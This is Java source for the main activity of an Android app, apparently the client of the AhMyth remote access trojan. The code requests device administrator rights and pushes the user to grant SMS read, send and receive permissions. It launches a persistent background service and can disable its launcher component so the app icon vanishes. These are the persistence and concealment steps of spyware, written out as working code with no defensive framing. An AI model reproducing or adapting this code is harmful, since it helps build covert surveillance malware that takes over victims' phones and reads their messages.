package ahmyth.mine.king.ahmyth;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.view.View;
import android.widget.CompoundButton;
import android.widget.Switch;
import android.widget.Toast;


public class MainActivity extends Activity {

    DevicePolicyManager devicePolicyManager;
    ComponentName componentName;
    SharedPreferences sharedPreferences;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        componentName = new ComponentName(this, AdminReceiver.class);
        devicePolicyManager = (DevicePolicyManager)getSystemService(DEVICE_POLICY_SERVICE);

        if (devicePolicyManager.isAdminActive(componentName)) {
//            Log.d("MY_TAG","Ok then");
        }
        else {
            Intent intent= new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, getString(R.string.device_admin_explanation));
            startActivity(intent);
        }

        if (
                ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED
        ){
            Intent mIntent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            mIntent.setData(Uri.parse("package:"+getPackageName()));
            startActivity(mIntent);
            Toast.makeText(this, "Grant all permission before!", Toast.LENGTH_LONG).show();
        }

        Intent serviceIntent = new Intent(this, MainService.class);
        ContextCompat.startForegroundService(this, serviceIntent);
//        --------------------------------------------------------------------------------------------

//        startService(new Intent(this, MainService.class));
//        finish();

        if (android.os.Build.VERSION.SDK_INT <= Build.VERSION_CODES.P){

            Switch hide_icon_switch = findViewById(R.id.switch1);
            hide_icon_switch.setVisibility(View.VISIBLE);

            sharedPreferences = getSharedPreferences("AppSettings", Context.MODE_PRIVATE);
            final SharedPreferences.Editor appSettingEditor = sharedPreferences.edit();

            hide_icon_switch.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
                @Override
                public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {

                    appSettingEditor.putBoolean("hidden_status",isChecked);
                    appSettingEditor.commit();
                }
            });

            boolean icon_hidden_status = sharedPreferences.getBoolean("hidden_status",false);

            if (icon_hidden_status){
                fn_hideicon();
                hide_icon_switch.setChecked(true);
            }
            else {
                hide_icon_switch.setChecked(false);
            }
        }
    }
    

    public void fn_hideicon() {
        getPackageManager().setComponentEnabledSetting(getComponentName(),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
    }


//    for activity_main functionality
    public void openGooglePlay(View view) {
        Intent GoogleIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps"));
        startActivity(GoogleIntent);
    }
}
